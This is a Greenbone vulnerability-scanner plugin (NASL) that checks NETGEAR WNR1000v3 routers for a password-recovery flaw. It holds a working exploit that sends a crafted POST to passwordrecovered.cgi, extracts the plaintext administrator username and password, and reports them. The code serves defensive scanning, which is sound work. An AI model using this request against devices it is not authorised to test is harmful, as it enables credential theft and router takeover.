# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103880");
  script_version("2023-07-12T05:05:04+0000");
  script_tag(name:"cvss_base", value:"9.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:C");

  script_name("NETGEAR WNR1000v3 Password Disclosure Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124759/NETGEAR-WNR1000v3-Password-Disclosure.html");

  script_tag(name:"last_modification", value:"2023-07-12 05:05:04 +0000 (Wed, 12 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-01-14 10:28:55 +0100 (Tue, 14 Jan 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("WNR1000v3/banner");

  script_tag(name:"impact", value:"An attacker can exploit this issue to bypass certain security
  restrictions and gain unauthorized administrative access to the affected application.");

  script_tag(name:"vuldetect", value:"Send some special crafted request to determine if it
  is possible to read username and password.");

  script_tag(name:"insight", value:"Netgear WNR1000v3 routers suffer from a flaw in the
  password recovery flow that allows for disclosure of the plaintext router credentials.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"summary", value:"Newer firmware versions of the Netgear N150 WNR1000v3
  wireless router are affected by a password recovery vulnerability. Exploiting this vulnerability
  allows an attacker to recover the router's (plaintext) Administrator credentials and subsequently gain
  full access to the device. This vulnerability can be exploited remotely if the remote administration access
  feature is enabled (as well as locally via wired or wireless access).");

  script_tag(name:"affected", value:"Tested Device Firmware Versions: V1.0.2.60_60.0.86
  and V1.0.2.54_60.0.82NA");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("host_details.inc");

port = http_get_port( default:8080 );

banner = http_get_remote_headers(port:port);
if ( "NETGEAR WNR1000v3" >!< banner ) exit (0 );

req = http_get( item:'/', port:port );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

id = eregmatch( pattern:"unauth.cgi\?id=([0-9]+)", string: buf);
if ( isnull ( id[1] ) ) exit ( 0 );

id = id[1];
useragent = http_get_user_agent();

host = http_host_name( port:port );

req = 'POST /passwordrecovered.cgi?id=' + id + ' HTTP/1.1\r\n' +
      'Accept-Encoding: identity\r\n' +
      'Content-Length: 0\r\n' +
      'Host: ' + host + '\r\n' +
      'Connection: close\r\n' +
      'User-Agent: ' + useragent + '\r\n\r\n';

result = http_send_recv( port:port, data:req, bodyonly:FALSE );

if ( "Router Password Recovered" >!< result ) exit ( 99 );

lines = split ( result );

x = 0;

foreach line ( lines )
{
  if ( "Router Admin Username" >< line )
  {
    username = eregmatch ( pattern:'<td class="MNUText" align="left">([^<]+)</td>', string: lines[ x+1 ] );
    if ( isnull ( username[1] ) ) exit(0);
  }

  if ( "Router Admin Password" >< line )
  {
    password = eregmatch ( pattern:'<td class="MNUText" align="left">([^<]+)</td>', string: lines[ x+1 ] );
    if ( isnull ( password[1] ) ) password[1] = 'empty password';
  }

  x++;
}

if ( username[1] )
{
  report = 'It was possible to extract the username and the password of the remote WNR1000v3.\n\nUsername: ' + username[1] + '\nPassword: ' + password[1] + '\n';
  security_message( port:port, data:report );
  exit ( 0 );
}

exit ( 99 );
